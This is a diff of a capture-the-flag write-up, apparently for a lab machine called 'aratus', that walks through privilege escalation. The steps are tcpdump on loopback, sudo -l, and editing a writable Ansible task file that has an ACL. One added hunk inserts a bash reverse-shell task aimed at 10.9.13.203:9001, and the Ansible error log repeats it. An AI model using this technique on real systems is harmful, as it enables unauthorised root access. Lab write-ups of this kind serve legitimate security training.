@@ -327,7 +327,7 @@ link-local 169.254.0.0
        valid_lft forever preferred_lft forever
 ```
 
-These are the interfaces linpeas provided so we can sniff lo :)
+These are the interfaces linpeas provided and this matches up with what the processes are pinging in the logs from pspy, the loopback's inet is: 127.0.0.1, so we need to check out lo with tcpdump :)
 
 ```
 [simeon@aratus tmp]$ tcpdump -i lo -A
@@ -398,7 +398,7 @@ Okay, we have access as theodore, but we still need root.
 uid=1001(theodore) gid=1001(theodore) groups=1001(theodore) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
 ```
 
-So we try sudo -l to see if we can find anything.
+So we try sudo -l to see if we can find anything, or else we need to get to enumerating again.
 
 ```
 [theodore@aratus ~]$ sudo -l
@@ -420,7 +420,7 @@ Okay great, this means that we can run /opt/scripts/infra_as_code.sh as user aut
 cd /opt/ansible
 /usr/bin/ansible-playbook /opt/ansible/playbooks/*.yaml
 ```
-
+We see in the script 3 file paths are mentioned.
 So now we just follow where the script leads us to see if there are any files we can modify or permissions we can play with.
 
 ```
@@ -499,6 +499,8 @@ Okay, so here the file permissions are important.
 As you can see there's a + sign for "configure-RedHat.yml", which means there is an ACL attached to this.
 ACL = Access Control List, which adds more permissions for file systems to add onto the UNIX ones.
 
+To set these permissions you would use setfacl, and to read them you would use getfacl.
+
 ```
 [theodore@aratus tasks]$ getfacl configure-RedHat.yml
 # file: configure-RedHat.yml
@@ -515,6 +517,9 @@ Our user, theodore, has read and write access to this file, so we can do malicio
 I open the file and use a reverse shell generated from revshells.com.
 
 I add it in as a command with a name called root, following the syntax for yml files.
+
+- name: root
+  command: /bin/sh -i >& /dev/tcp/10.9.13.203/9001 0>&1
 
 ```
 [theodore@aratus tasks]$ cat configure-RedHat.yml 
@@ -569,7 +574,7 @@ TASK [geerlingguy.apache : root] ***********************************************
 fatal: [10.10.102.251]: FAILED! => {"changed": true, "cmd": ["sudo", "/bin/sh", "-i", ">&", "/dev/tcp/10.9.13.203/9001", "0>&1"], "delta": "0:00:00.022810", "end": "2022-03-26 20:04:00.938186", "msg": "non-zero return code", "rc": 127, "start": "2022-03-26 20:04:00.915376", "stderr": "sh: >&: No such file or directory", "stderr_lines": ["sh: >&: No such file or directory"], "stdout": "", "stdout_lines": []}
 ```
 
-Since it does say no such file or directory, I thought that maybe we could create a text file and then just run it with the file we can edit.
+Since it does say no such file or directory, I thought that maybe we could create a text file and then just run it with the file we can edit using bash in the command: line.
 
 So we go to /tmp and create a text file called shell.sh containing our shell.
 
